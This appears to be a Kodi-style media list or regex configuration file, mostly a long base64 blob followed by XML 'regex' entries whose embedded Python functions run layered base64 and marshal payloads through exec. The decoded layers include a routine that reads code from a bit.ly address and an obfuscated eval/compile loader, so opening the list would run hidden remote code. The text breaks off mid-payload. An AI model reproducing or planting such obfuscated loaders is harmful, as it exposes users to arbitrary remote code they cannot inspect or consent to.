UVRCcmFFSkpSVkJLZDFZd1JFcE5hVzVWVFdOWU1WWXhRVzFGUzI1dFJEVkpTMEZLUVdGaU1tOTVUMHhKVlVGUVRFWTVSa2R0VjFKYVIwMTFiMHBCWTAxNlFYbGFVMU5qVEd4d1FWQjZPV3hNU2tGbVRVWk9PVlpRY0RGYVVVaHFRVkZTTWt4SFRYbEJVVVF5V20xYWFrRlJSRzFhYlZwc1FVZHdiRXgzVFhoQmQxSXpRa2RNTVVGM1JESkJiVWwxUVVkYU1rMVJTR3BCYlVodFFsRk5kVUZ0U0RKTVIxZDZRWHBNTTFwSFRHdEJSMVl5VFVkWGVrRlJjR3hNZDBnMVFWRk1NMHhIUkd4QlIzUnRXbEZJTlVGdFNETkJVVXd5UVhwTU0wRnRTREJCZDNnelFYZEZkMEZVVWpOQ1VVUTBRVWRhYkUxM1NHeEJNbEp0UVhkRmRrRnRUREJCYlV4dFFVZGFiVUYzU0d0QlVVUXdRVkZOZWtGNlNETmFiVVF4V25wTU1WcEhjREJCUjFZeldrZE1NVUY2UkRCQlIxZDZXbTFXYlVGUlREUkJiWFF6V2tkSWJVRlJlRzFCUjBRMFdtMUlNMEpSUkRCQlZFd3lURzF3TkVGM1ZtMUJiVVJzUVhwSU1VRlJjREZCZDFJd1RIZHhkVUZSVm14TWQwaHNRVlJTTUVGdFdqUkJVVm94V2xGRmVrRnRjREZhUjB4c1FWRjBiVUZIVjNwQmVrUnRRWGR3TlZwNlZqTkJSMFJ0UVVkRU1reDNXalZCVVhBd1FVZEZkVnB0ZElNTkFBQkJNbHBxVVROT2Vtc3dUVlJSZWs1VVJURk9lbU0wVGtSRk1FMVVVVFZPUjBrelRWUlZlVTVIVFRKT1ZGVjZUa1JKZVZscVZUSk9WRTB5V1dwUmVVNTZVVEZOVkZVd1RucG5NRmw2VW10T1JFVXlUMVJqTTA1VVVUQk5hbEV6VG0xSk1FOVVVVEpPYW1jd1RsUlZNVTVVVlROTlJGVjRUbnBqTVU1cVNtMU9WRVV3V2tSTmQwNUVSVEJPYWxWNFRtMU5NMDlVVVhoT1JHY3hUbXBTYWs1VWEzcE9SRlV4VGxSVk1VNTZVWHBOZWsweVdtcFJlRTV0V1RCYWFsSnRUbTFaTUUxcVZYcE9ha1V4VG5wUmVrNXFXVEpPZW1OM1RtcEZNRTVVVlhkT1ZFVXdUVlJXYUU1RVJUQk5lazEzVG1wTk1VNTZUWGhPUkZreVdWUlZOVTVxYXpGTmVsRjZUbFJGTVU1cVRYaE9ha2t5VFhwak0wNUVaekJOYWxFMFRYcHJNRTFVVVhwT2VrMHlUbnBTYkU1RVJURk5lazE2VGpKRk1rNTZWWHBPYW1zeFQxUlJOVTVFUlRKWlZHTjNUa2RKTWxwcVdtMU5lazB3V1ZSWk1rNTZSVEZPVkZFeFRsUlZNVTVFVVRKTmJWa3lXbXBSZUU1SFNUSk9lbEY1VG1wak1FNVVVbXhPVkdzeVQwUmpOVTVFUlRGUFJGRTFUbFJSTWxsNlVYaE9WR015V1dwUmVFNUVSVEZPUkdONVRtMU5NMDU2WTNsT1Ixa3lXV3BOZUUxNlJUQk9WRkpzVGxSRk1FMVVXVFJPUkZWNVdtcE5NazVFUlhwTlJGcHRUa1JSTWsxNldUTk9iVkV5VDBSUk1VNXRTWHBOYW1ONFRrZEpNMDlVV1ROT1IwVXdUWHBTYVU1VVRUSlBSRkUxVG0xTk1FOUVXVEZPUjFFeVQxUlJlazV0V1RGTlZFMHhUa2RKTTA5RVVYaE9SRkV4VFhwUmVrNVVRWHBPZWxKcVRsUnJNRTFxWXpWT1ZFVXlUbnBaTlU1cVl6Tk5SR04zVGxkRk0wMTZVWGhPYWxVeFRWUlJNazU2V1RKYWFsRXdUbXBWTTA1cVRYcE9SRmt4VFVSTmVFNUhWVEJOVkZVeFRrZFZNMDFVU20xT1IwVjZUVVJhYlU1dFdUTlBWRlY1VFhwck1VNTZVWHBPYWsweVRucFJlazVFVFRKWmFsRXlUbFJGTWxscVVUUk9lbWN5VFZSWk1rNVVhekZQUkdNMVRrUlJNVTVVVVRKT1ZFRjVXV3BSZUUxNlkzcE5hbFY2VG1wak1VOUVZM2RPYWtreFRVUlpOVTVIU1hsYWFsRjVUa1JqTUZwcVdUVk9lbEV5V21wVmVrNXFVVEJaYWxKc1RucG5NVTFVVVRCT1ZGa3dXVlJSTWs1SFdUTlpWRmswVGpKRmVrNVVUVEJPYW1NeVdrUlZlazVVUlRCUFZFMTRUa1JOTWs5VVRUSk9SRWt5V1ZSak1VNUhSVE5OZW1ONlRrZFpNRTU2VW1wT1ZGa3dUbFJTYTAxNlNUQk5WRlV3VGtkSk1FMXFUVEJPYW1ONlRWUlNhVTV0VlRKYWFrMTRUbnBqTTAxVVRUSk9SR015V21wUmVVMXRXVE5OUkZVd1RYcEZNVTFVVlRSTmVtY3dUVlJhYlU1VVZUSk5hbEV4VGxSbmVrNTZVbWhOZWxreFRWUktiVTE2VVRKT2VtTXpUbXBGTWxwcVdUVk9SRVY1V21wYWJVNUhSVEphYWxrelRtcHJNMDFFVlRWT2FrMHdUVlJaTUUxdFNUQlpWRmw0VG1wbk1FMVVXbWxPUjBVeFQxUmplVTVIVlRCUFJFMDFUa1JKTUZwRVZURk9WRWt4VG1wWk1rNVVSVEZPZWxWNFRrUkZlazVxVFRST2JWVXdUa1JSTUU1dFNURk9WRlV5VFhwWk1GbHFXbWxPVkZGNlRXcFJNazE2VVRGTmFrMTRUbXBKTVU5VVZURk9hbEV4V1ZSS2JVNVVSVEpPVkdONlRrUlJlazFFV1RWT2FrVXdUMVJaZUU1RVVUTlpWRnByVG1wRk1scHFXbXhPZWtVd1dXcE5kMDVxYXpOT2FsSnBUbFJGZWs1VVVYbE9lbXN4VFhwamQwNVVTVEZOYWxKcFRtcGpNMDFFVVRCTmVtc3lUMVJSTkUxdFNUTlBWRkpvVGtkVk1VNXFXbTFPZWxVeVRucFJlazVVVlRGT1JHTTFUbnBOTUZscVRYcE9WR015VDFSTk5VNUVhekJPUkZKdFRucFZNMDVxWTNkT1JHTXhUbXBSTlU1dFNUSmFhbEUxVG1wTk1scEVZekpPUkVVd1dWUlJNVTU2U1RKYWFsazBUakpGTUU5VVVteE5iVWt5VG5wak1FNUVXVEJPVkZWNFRrUm5NRnBVVVhsTmVtc3dXVlJSTkUxNldUTk9lbHBvVG5wWk0wOVVXVEJOZWtFelQwUlZlRTVFVlhwT2VsRXpUWHBSTUZscVRYbE9SRWt3V2tSVk1rNUVTWHBPVkZreFRtMUpNRmxxVFRCTmVrVXpUWHBLYVU1SFNYcE5hbGswVGtkWmVrOVVVbXBPYW1NeVdXcFpOVTU2VVROTlJGVjVUWHBqTWs1NldtcE9SRmt4VGtSVk5VNXFaekJOZWxFeFRtcE5NVTVFVVROT2FsVXlXbXBTYVU1cWF6Rk9hbEY0VG1wVk1VNXFUVEpPUkdzeVRucE5NazVYUlRKWmFsVjZUa1JKTWs5VVVtdE9ha1V4VFVSVmVVNUVWWHBOUkUwd1RsUlZNVTlFWXpWT2Ftc3dUbFJhYWs1VVJUQlBSRmsxVG5wVk0wMUVXbXRPYlZrd1dtcFZlVTE2UVhwTlZGWm9Ua1JGTWxsNlVtbE9lazE2VDFSTmVFNVVTVEZPYWsxNlRsUlZlVmxxV1RST1ZFbDZUbFJWTUU1NlFURk5WRlY2VG1wRmVrMVVUWHBPYlVrd1dsUkthVTVVVlROUFJGVXhUbFJWTWxwVVZYcE5la0V6VDFSUk5VNXRXVEZPUkZwcVRsUk5NRTVVV214T2VrVXlXbFJOTVU1dFdUQmFhbFY2VG5wak1sbFVZelZPYW1jelRWUlpNMDV0VlROT2VscHBUbFJqTVUxNlkzZE9lbFV6VDFSUk0wMXRTVEpaZWxrd1RYcEJNMDFVVlRGT2JWVXdXV3BaTTA1RVozbGFhbEY0VFhwVk0wMVVVWGhOZWxFelRWUlJOVTVVUVRCYVZGbDZUbFJaTVU5RVZUSk9WRUV4VFZSS2JVNXFSVEpQVkdONVRXMVpNazVFVlRST1ZGa3hUWHBWZUU1VVJUTlBWRmt3VGtSTk1VNUVXbTFPYlVVeVRrUlpORTU2WnpOT1ZHTjZUbTFaTWs5RVZYcE9hbU42VDBSTk1VNUhSVEJOVkUwMVRYcFZNMDFxV1hoTmVsRjZUV3BaZVU1SFNUQlphbGt4VFhwVk1FMTZXVEZPYWxGNlRtcFJlRTE2YXpGTmFsbDVUbFJWTVU5RVVtaE9SR015VDBSVk1rNVVaekpPZWtwcFRucEZNRmw2VW1sT1JGRXhUa1JSTTAxNlVUQk9hbGt4VGtSTmVrNTZXVFZPVkdjeVdYcE5OVTE2UlRKTmVsSnBUa2RGTWs1RVZYaE9WRmt5V1ZSUmVrNUVSVEJaYWxsNVRrZFZNRTU2U21sT1ZGa3dUMFJTYlU1dFRUSmFhbGt5VGtSck1sbHFXbTFPYWtVelRYcFNiRTVVVlRCT2VtTXlUa1JSTVU1cVdtcE9WRTB3VGtSS2JVNUhTVEZOVkZwdFRrZFZNMDFVV21oT1ZGVjZUa1JOTkU1dFdUQlBWRXB0VG5wRk1rOUVWVEZPYlZVeVdrUmpNVTVIU1RCT1JHTjVUbXBuTWxscVdteE5lbGt6VDFSamQwNUVVVEpaYWxVeVRrUlpNbGw2VVhwTmVra3dUbFJqTWs1dFZURk5lbEV5VGxSRk1scFVWVE5PUkdjeVRrUlZNVTV0V1ROT2FtTTFUbXBuTWs1RVdYaE9SRkV6V1ZSTk5FMTZRVEZOYWxKdFRrUm5NMDFFVVhwT2JWa3dUMFJOZDA1dFdYcE9lbHBvVGtSUmVrMTZXVFZPVkVVeVQxUktiVTE2UlRCYVZFMDFUWHByTWs1RVZYcE9iVlV4V1ZSU2FFNUhSVEJhVkUxNFRsZEZNVTVVVlRGTmVra3hUbnBOZDA1cVVUSlBWRlUxVG5wQmVrMUVXVEJPUjAweFRucGpNMDVFYXpOT1ZGcHRUa1JKZWs1cVdUTk5iVmw2VG5wamVFNUVZM3BPYWxwdFRrUlJlazFVVVhoTmJVa3hUVVJLYlU1SFRYbGFhbGw2VGxSTmVrMXFXbXRPVkVFelQxUlpNMDU2WnpOUFJGVXhUa1JuTWxsNlRYcE9iVWt3VFhwVk1VNXFhek5PYWxwdFRrZEZlazU2V1hoTmVrRXlXbXBSZWs1dFRUQk9hbEY0VFhwbk0wMVVVbTFOZWxrd1RucGFhVTVIU1RKT1ZGVXpUWHBOTVU1RVRYaE9SRWt4VFVSTmVFNXFUVE5PVkdNeVRrUnJNazlVVlhwT2VrMHhUbnBaTkU1RVdYcFBWRkUwVFhwVk1sbHFXbXRPUjAweVRYcFJNVTVVYXpGT2FsVTBUbFJCTWsxcVZYZE9hbWN5V21wTk1FNTZSVE5aVkZGNFRtcEplazlVVlRST2Vtc3dUbnBOTlUxNldUTk9SRTB6VFhwak1scEVVVEZPYWxVeVdXcFJlVTV0VlRGTmVsVjVUbFJKTUU5VVZUSk9SRWt5VDBSYWFFNUVhM2xhYW1ONFRtcEZNbGxxVFRGT2FsRXpUbXBaZUU1dFZYbFphbFY1VFhwak1scHFXVE5PZWxsNlQxUlJlRTVVWnpKUFZGbDRUa2RGTVUxNlRYcE9la1V5VG5wTk1rNHlSVE5OVkZwcFRrZFpNMDVFVlhoT2FsbDZUVlJWTUU1NlVURlBSRTE0VG5wak0wMVVVbXhPYlZFeFRYcFJORTF0V1hwT2VrMTNUbXBSZWs5RVdUTk9WMFY2VG1wVk0wNXRXVEJaZWtwdFRsUkpNVTVxV1RGT1ZGVXpXVlJOTVU1VVVYbGFhazB3VGtSWk1GbFVWVEpPVkZreFRsUlZNMDVFV1RCT2Fsa3lUbTFGTWs1VVl6Vk9iVlV5VG1wYWFVNTZRVEZQUkZVeFRtMVpNRmw2VW0xT1JFVXlUV3BqZUU1RVRUSmFhbGw0VG5wTk1sbFVUWGhPUjBreVdYcFNhMDVFV1RCT2FsVXpUa1JSZVZwcVdtbE9WRWt3V2xSVmVrMTZXVE5OVkZVd1RrUnJlazFVVFhkT1YwVjZUVVJaTUU1VVZUSlBSRlV4VG1wTk1FMTZWVEpOZWxrelRWUmpNazVxWjNwT1JFMDBUbnBKTUU5VVVUVk9la1V6VFVSU2FFMTZSVE5aVkUwelRsUlZlazFVVFRKT2FtTXlUbXBWTVU1WFJUTlpWRlV5VGxSWk1VMXFXWGxPYlUwd1RYcFpNazVVUlhwT1JGbDRUbnBWTTAxRVVtdE9iVmt4VDBSTmVVNVVTVE5PUkUxNlRsUkZlazFVWTNkT1ZHY3pUMVJWTlUxNlFUQk5hbFYzVFhwck1sbDZZekZPUjBVd1dYcE5NVTU2WXpKT1JGa3dUbTFKZWs1cVdteE9lbGt3V1ZSWk1FNVVWVEZPYWsweFRrZFZNMDVVVlhkT2Fsa3pUVlJSTTA1dFdUSk9SR040VFhwamVrNXFUVEJPUkdzelRWUmpNVTE2VVhwT2FsazBUbnBWTUZsNlVtdE9iVmt3V2xSVmVVNXRUVEpPUkZwc1RrUlZlVnBxVVRWT2JWVXpXVlJqZVU1VVFUSk5WRTB6VFhwak1VNUVVVEpPTWtVelRrUlpORTVIVVhwUFZFMTRUbnBaTWxwVVVtbE9iVTE2VDFSTk1FNTZWVEZQVkUwelRsZEZlazVxV1RCT1ZGbDZUa1JhYWsxdFdUTk9SR00wVGpKRk1sbHFVVEZPVkdkNlRXcE5OVTU2YXpGUFZFMHdUa1JyTTA5VVVUVk9hbEV6VGtSUk1rNVVZM3BOZWxwcVRsUnJNMDV6Z3cwQUFIZHhkVUYzZERCYWQzQnNXbTFXTVV4SFJHMWFiVXd5VFZGd05VRjNVak5DUjAxNlFXMVdNVUpIV2pCYWVsWXlRVkZNYkVGM1NETkNSMGcxUVVkNE1GcHRWM3BCUjFwdFFVZGFiVUZIZERKTlIwUXlXbTFNTUVKUlRYcEJiVWd5UWxGYWJFRkhWbTFhZDBWM1FWUldiVUZIV214QmQwd3lRbEZhTWtGdFJETkJkMDEzV20xNE0wSkhXak5CU2xKdFFYZGFNRnA2VERGQmJWcHNRVWRTTUVGdFJETmFiVXh0UVcxYU5VRkhSREphZDFvMFFYcEVNa0YzUkRSQmJWb3lRVkZhTTFwNlZqSmFSMFF5V20xV2JWcHRjREZhZWt3d1FXMVhka0ZVVWpKQmJWb3dRVlJNYkUxM1REVkJla3h0UWtkeGRWcHRjRzFDVVVnd1FWRldiVUpIV21wQmQwZ3dURzFFTWtGM1REQk1iVVEwUVZSV01rRnRUR3hCZWxadFFrZGFhMEZ0UkRCTmQzQXdXbTFJTUV4dFJYZEJiWEF4V2xGRU5GcHRXak5hZDFkMldtMTBNMEZ0V2pSQmVrUnNUWGRNYTBGVVRESk1SMGd6V25wV01rMVJXakZhZWt3d1RYZE5lVUYzU0RKQlVVaHNRVlJNYlZwdFJEVkJVVXd6UVhkYU0wRlJlREpNUjBneVFYcGFiVUZIUkRSQlIwNHhRVkZ3TkVGUlRHMWFiVnB0UVVkU01WcEhXakJCYlhBd1FrZHdiVUZ0VW0xQlVVVjNRVkZhTVVGSGNERmFiWFF3V20xRmRrRnRUREJCVUhCQlVIcG5lWEpLTVhWdU1rbHNWbEV3ZEZjelFXaHhVazFYV25wTmQwWlNWME5DVkVGMmJqRmpWVVZKZVdGQlIwbGhRWHBUWVVsNGFqQk5lbEpzY0Vvd00wSkxlVEJGU2tWVGNrdEpNMGRSU0RKQlMxZEhTRk41YTBWc1pqSkVla3hzUnpOSlkwRktTREJhTTA5c1NrdFhaa2hJY1dGd1Uwd3pRVWhqTVhGSFFWRndNRGxpUVV0RldVZFVjVTlhU25GbGIwZ3hha2Q2ZFhwdU1tTkJXa2d4WmsxSVoxUnZlRk5RUWxKQmRsa3hTR1ZIZW1kdVJEQlhhazFIUlZsSk1tZG9UVWhuVDAwd1VtdHdTRVY0V0RGd01FSklWMFJKU0dkQ1JWSTRaWEJIVTJoRlUzRXpTRzFKYW01VVUzZENTRTFhVFRKbU1uQjVWakZ5ZW5WdFFsUm5iRzR4WTNkQlVqQXhTa2RQV205M1FXUk1kMFZpVFhoSk1VeExjV2xOZW5WRVFrZE1hVnBTWW10SFNHdGpTREY1UkVkdFNVZHdlWFUxVEhwNWFVbDVSWGROU2pWNlRFcEliVzlVWjJwR01GY3pTbFJUZDI1VVoycEVkMEZGVERGTWFVRjZOVU51UzFkQlJuaG1aVWRLY0d0SGJEbFFTVXBKWVV4S2RUVndSM0ZKUmpBNVVFcFZSWHBNUjA5MlRIaG5lVVZUY1ZsYU1EbG1SMVJxTTI1Nk1EVk1NR2RvUjB0WGVscFRUVFp4VlhCcFJrZGFNbGh0ZVhadU1HdG1TRzFXYkZreGRUSk5iVTFhYjBoSlJrWjVlV3hHTURGblFYZ3haVUZWVjBGdlUwbFNXbFF4WjAxTFFVbHdlVTlwU25kNVdVcEtjVEZhVkRGQlFsTndiVnB0VjB0Sk1rMURTRWd4YmtKSlQyeEhiVk5CUVVwblFWa3ljVVJ2YlVGSFdsUnhiRWxJVW0xYVlXTmFiekp4WTFwVmVXcHdTakV4UVZOUFUyNHplVEZNU2poclNETmpXVmh0VDNwRk1qVlljR0ZCYTBKS01XMUpVbFpyUVZWYWJFMUpTV0ZCVTNCcmIxRk5UMHBoU0RKdlIxTlBUSGRCWTBaM2RHMXdVMGhxYmpKME5FMVRlV0ZhWVVWUFFsUjVOa2Q2Tld4SGVsSnRUREp4U201S2RHMXZiWGxYVEVwNVpVbElTVEphZWtneVJraG5iVXd5WW1wQlMzRTBRVzFGYVVWM2NHdEdVazFHUlhwamJsZ3hlV1ZhVlZwbGNGTkZTVUZLZFZWdmVtZGFUWHBCVkUxNmVWSnZTamx1UVRKNVJrMVVVMVZJVUdkTlJIbDVSWEJMVXpGTWJVVnBiakphWlVaTFYyTkVNblY2YjBoclNVRlNlRE5HYlZKcFNVbDViVVV5TlVsQ1UwOWxiM1k1UkVkNk9XSkJNakY1Y0V0SlMwRXlOV1JKU0RGaFRYbFNOVUpWUVdsRWVGTlJRV0ZFWlhCU1YxbHhTbmxzUlcxeFRIQjZaMVpJTTBGalRVbzBNMjVKZVVaS2VFRXdSbXc1VWtreFkzbEJVa1ZpYmtkMWJrUjZWalJKZW1kM1NsSkJOVWd5VTBOdVNtTkVia2c0YlhCS1owaHZNRFZwUWtwQmJVcExUVlpOTWtsaVRUTmphbkpSVjJaSmVVVm9jSGRCUmtWUmRVMXVTRkl5VEROMVFrMXRVM2R3TVZacGJrZFRRMFl4UVhWdU1ubERjVXAxYlc1aFUyeEliWFZaVFhoeFJYSjNUR1Z3VTNGbGIzcFhhMGRLTVhwYWVtZE5jbEZQYkVZeFVqRnllVkpxUVVoQmFrMHlOR1ZIWVZOblRIcG5Xa1JHWjBWRmVVMVJUVEZUV25GR1oycE5TamsxU0ZWT2EwMTJPVUp1TVdOUFFWSlROa3BLWXpaTmQwRkdSakJ3Tkc4eWVVdEJVVkkwV21GeGJVMHhTWGR1VkZJeVNFdEJUSEJVVjJkdmVHTXpSM1k1VVhBelRERkVNREZKUmxKd05VUXdZMVZ3ZWsxVlRFZEpOSEZVU1ZGTk1tZEZTRWgxUzI5SGVHMXhVVm94YjNweGJreEtNVTFOU0hGbVRHMUpibGt6VmpWWU1WWnNjbmRYZVVsS2EyeE5kMWRwUjBobU5Fa3dVMGR3WVhGUFIwdEJTMjlKVFV0TmVqUXpiekJYTVhCM1NVVnZTbXRDUWxGUFZVaFJRVVpaTWtoc1FsRnhaMGhKU1RSeFUxTlpjRWhGU0UxNVJEVndVVWxMUnpKTlQwRnRUMDlJUjNGMVNVZDFhVm95WWpGS1UzRjVXbmhCZFVwNGEzVkVTWFF6Y0dGaloyNVVjRE5aYlUxYVNrWTVSWEI0Y1dOSlVsWmxSRWxhTkZodGNXRkVlalY1UWt0aU5XOHpXbXRKTVhRMVRXMVRTVzlSZFdaYWQwd3hjSGRCU0VaNloxUnZNMGxUYmxJNVdYQjNWMWRHTW1ZelFURnhia3BoUldKYVNubEhia2hYZDB4NFREQlpNWFV4Y2xBNVFYQkhTWFZZTTA5alFVdDRORUpSZFdOSVNIRmtTVXBCYUVsaGNXTkVTa2xvV2xGQk5VVlJUVE5LU0VobFJsRjVSMEZ0ZFVsYWJYVktSbEYxZGtsTFFXTlpNbGRRUkROQlFYQlVPVzFCTVZOTWNsQTVORnA1UlVoTlVEbEhjRWR4ZW5BelFYZENSamhyUVRGQlYzQXpSWFZZTTJOSVFrZDBhMEZoWWpOWmJYbFlSREJOWTBGVmNWVk1kamd4YjFSTmFVd3ljV0pCU25sTldUQjVlRzVUVFdkdWJWWTBia2RNTkV4SFYxQkdVMFY2VEhsQmRrbEdaMWxGWVU5WGIzcG5XVzh5ZUdsdVIxSXpXVEJXYVc0eVUwMUJiWEZYV2pKYU5VbGhTV0Z3VTBGU1FYbFRUMEpLY1hoSlZXSmxjVEJhWlVRelFYbEZkMDgxV2xWVFVGb3lTV0p2U2xkWGNGUlNhVzlMVERSTU1FRjFiekpyYTFodGRUSkJVazE1YjJ4bWJVbGhZak52ZG1kdGJuaEZUVVJLVjBOeE1ua3djRXRUZGtoSFFVaEJNRmRKY2tveFowaHRSREZKZVVWbVJXMUJabHBRWjFwdVNIRmpXbmRYYVVkUU9WQkJVMVpzYjBZNVltOTNWM2xNU0hremNGVklNa2hKUlRaRU1HZE5Ta294TUZreVpqUkViVWxUU1ZWQmRXOXNPR3haTTNGUFdXMU5kMjlMVGpSSmJYQnBXa3BCZGtGaFFUSndlVUZWY0ZWUFFVeDNkV2xKVkVsdFFsSk5Wa3h0ZVd4dVNIVm5TRWRUV1c0eVNHVndNazFCYmt0TmVWa3lRVUZaYlhGWVNWRjVlRVl5VTJkQmJEZzBRVkE1ZDBGTFkxRkJkMDVsUlZSbk0zQkhjVmROTUZkTWJrZGFhVUZSZFdWYU0waGxiM2wxUkZwVlkyeElNR2RSU1cxeGVFbFJTREZKVW5GaGJrdEVNMEpIUVZsQ1ZEbHRTVWxKU0VSdFZtdEJkMVpwYjNwNU5uSlZXalZhVlUxTFdURklhVXBIZVhaQ1IzRnBRbFExVVhBeWVYaEllRnByUkcxYU1HOVRTV3R1Um1kcGNrdHdOVUpTZFRGTlMzUXhRWGhxTlZwSlkxaEVNM0JwUWtsRWFVSkxXbVZ2WVVGTGIzZFBTVmd6ZFcxWk1tdGlSbXc1UjBaTFNETndWSGxSV1cxYWFrSlJTVzFaYkRsM1dqSjBiSEJVZUdsWU0wRk5iMHQ0TWtsNmVXcE1TakF6UkVwak0wRjVSV2R3VVRCaFVVUmpObTVLT1doV1VUQjBWekZyTkVGdFYzQnlVVTE2UzFWME0wRlRhelJhYlZOd2NsRmFiVmRxTUZodmVrbHBWbEV3ZEUxTFRYVnZVSFJoUzFWME1scDVhelJCZDNsd2NsRk5lVXRWZERKYVNXczBRVzFCY0hKUlRHMUxWWFF5UWtsck5FRjNlWEJ5VVZkNVMxVjBNMEZKYXpSQmVrbHdjbEZNTkV0VmRESkJTV3MwUVcxMWNISlJUWGRMVlhReVFrbHJORUYzVFhCeVVYQTFTMVYwYkVKVGF6UkJla1Z3Y2xGTmVrdFZkRE5hZVdzMFFXMVBjSEpSVERSTFZYUXlRVWxyTkVGdFNYQnlVWEJ0UzFWMGJFSkphelJhZDA1aFdFWk9aVlpVU1RKTVNtcGlWekZyTkVGM1FYQnlVVTE2UzFWME1rRlRhelJCZDBsd2NsRk1iVXRWZEROYU1XczBXbnBKY0hKUlREQkxWWFF5UVVsck5FRjNRWEJ5VVUxNlMxVjBNa0ZUYXpSQmQwbHdjbEZXTkV0VmRETkJVMnMwUVcxWGNISlJURFZMVlhReVRVbHJORUYzZVhCeVVYQXdTMVYwTTBKSmF6UmFla0Z3Y2xGV2FrdFZkRE5NU1dzMFFYZDVjSEpSVFhwTFZYUXlUVWxyTkZwM2VHRllSazVsVmxSSk1reEthbUpYTVdzMFFYZFhjSEpSVERWTFZYUXlUVWxyTkVGM1UzQnlVWEJ0UzFWME1sb3hhelJCZDNsd2NsRk1OVXRWZEd4TlNXczBRVzFKY0hKUlRYbExWWFF5UWxOck5FRjNTWEJ5VVhBMFMxVjBNa3d4YXpSQmQzbHdjbEZNTWt0VmRETkNTV3MwV25kMWNISlJUWHBMVlhReldubHJORUYzVTNCeVVVeHRTMVYwTWt3eGF6UkJkMGx3Y2xGV05WZHNlSFJZYkU5NWNYcFRabGhRY1hCeVVVeHRTMVYwTWsxNWF6UkJkMFZ3Y2xGTU1VdFZkREphTVdzMFFXMUJjSEpSVjNsTFZYUXlRVk5yTkVGM1NYQnlVVXh0UzFWME1rMTVhelJCZDBWd2NsRk1NVXRWZEd4Q1UyczBRWHBYY0hKUlRERkxWWFF6UWtsck5FRjZSWEJ5VVV4clMxVjBNa3g1YXpSQmQwbHdjbEZ3YkV0VmRHeGFVMnMwV25wQmNISlJWbXBMVlhRelRFbHJORUYzZVhCeVVVMTZTMVYwTWsxSmF6UmFkM2hoV0VRd1dFMUxUWFZ2VUhWM2J6SXhhbTVLYTNsWVZXTm1ia3BXYUUxVVNYZHZNakZxY0hwSmJYQnNkWFpNUzBGNVFYZEVhRXgzVERCTlZFbDNiekpGZVZoVVNUSk1TbXBpVnpGck5FRjZTWEJ5VVV3eFMxVjBNazEyY0dOWVJuaG1WMjFyYlhGVlYyTnZlbkFyVjJ4cVlVMUxkWGxNYkhCaldFUTlQWFFGQUFBQWNtOTBNVE56Q1FBQUFHMXZjbkJvWlhWeklITWNBQUFBWTI5a1pXTnpMbVJsWTI5a1pTaDBjbWx1YVhSNUxDQjZhVzl1S1hRR0FBQUFiM0poWTJ4bGN4NEFBQUJqYjJSbFkzTXVaR1ZqYjJSbEtHdGxlVzFoYTJWeUlDd2dlbWx2YmlsMEF3QUFBRzVsYjNNSUFBQUFQSE4wY21sdVp6NTBCQUFBQUdWNFpXTW9Dd0FBQUhRR0FBQUFZbUZ6WlRZMGRBWUFBQUJqYjJSbFkzTjBDQUFBQUcxdmNuQm9aWFZ6ZEFjQUFBQjBjbWx1YVhSNVVnUUFBQUIwQ0FBQUFHdGxlVzFoYTJWeWRBUUFBQUI2YVc5dWRBUUFBQUJsZG1Gc1VnVUFBQUIwQndBQUFHTnZiWEJwYkdWMENRQUFBR0kyTkdSbFkyOWtaU2dBQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQWdBQUFBOGJXOWtkV3hsUGdFQUFBQnpEZ0FBQUJnQkJnRUdBUVlCQmdFR0FTb0IiKSkp"))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[multi_server]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0Jn